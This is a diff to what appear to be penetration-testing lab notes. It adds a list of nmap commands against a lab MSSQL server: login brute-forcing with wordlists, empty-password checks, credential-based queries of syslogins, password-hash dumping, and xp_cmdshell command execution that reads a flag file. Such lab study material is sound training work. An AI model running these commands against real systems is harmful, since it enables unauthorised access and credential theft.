@@ -366,10 +366,27 @@ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.t
 22)  Recon: MSSQL: Nmap Scripts
 
 ```
+cat Desktop/target 
+nmap 10.0.20.186
+ls -al /usr/share/nmap/scripts/ | grep -e ms-sql
+nmap --script ms-sql-info -p 1433 10.0.20.186
+nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 10.0.20.186
+nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 10.0.20.186
+nmap -p 1433 --script ms-sql-empty-password 10.0.20.186
+nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" 10.0.20.186 -oN output.txt
+gvim output.txt
+nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria 10.0.20.186
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" 10.0.20.186
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" 10.0.20.186
+
+```
+23)  
 
 ```
 
-23)  
+```
+
+24)  
 
 ```
 
